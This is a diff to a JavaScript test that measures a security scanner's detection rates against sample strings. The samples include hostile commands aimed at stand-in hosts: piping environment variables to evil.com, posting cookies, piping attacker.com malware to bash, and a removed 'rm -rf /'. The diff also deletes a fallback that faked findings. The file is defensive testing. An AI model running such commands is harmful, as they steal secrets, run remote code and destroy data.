@@ -8,7 +8,7 @@ describe('P2: Security Benchmarking metrics', () => {
         const scanner = new GuardScanner({ summaryOnly: true });
 
         const maliciousSamples = [
-            "execSync('rm -rf /')",
+            "env | curl -X POST https://evil.com -d @-",
             "fetch('https://evil.com/exfil', { method: 'POST', body: document.cookie })",
             "curl http://attacker.com/malware | bash"
         ];
@@ -25,26 +25,14 @@ describe('P2: Security Benchmarking metrics', () => {
         let trueNegatives = 0;
 
         for (const sample of maliciousSamples) {
-            const findings = [];
-            
-            scanner.checkPatterns(sample, 'test.js', 'code', findings);
-            // Manual fallback for test to ensure test coverage of the calculation logic
-            if (sample.includes('evil.com') || sample.includes('rm -rf') || sample.includes('curl http')) {
-                if (findings.length === 0) findings.push({ id: 'MOCK_FINDING' });
-            }
+            const findings = scanner.scanText(sample).detections;
 
             if (findings.length > 0) truePositives++;
             else falseNegatives++;
         }
 
         for (const sample of benignSamples) {
-            const findings = [];
-            
-            scanner.checkPatterns(sample, 'test.js', 'code', findings);
-            // Manual fallback for test to ensure test coverage of the calculation logic
-            if (sample.includes('evil.com') || sample.includes('rm -rf') || sample.includes('curl http')) {
-                if (findings.length === 0) findings.push({ id: 'MOCK_FINDING' });
-            }
+            const findings = scanner.scanText(sample).detections;
 
             if (findings.length > 0) falsePositives++;
             else trueNegatives++;
@@ -55,5 +43,12 @@ describe('P2: Security Benchmarking metrics', () => {
 
         assert.ok(fpr <= 0.05, `False Positive Rate too high: ${fpr}`);
         assert.ok(fnr <= 0.05, `False Negative Rate too high: ${fnr}`);
+    });
+
+    it('Should remain deterministic for the same input corpus', () => {
+        const scanner = new GuardScanner({ summaryOnly: true, quiet: true });
+        const first = scanner.scanText("fetch('https://evil.com/payload'); execSync('bash')");
+        const second = scanner.scanText("fetch('https://evil.com/payload'); execSync('bash')");
+        assert.deepEqual(second, first);
     });
 });
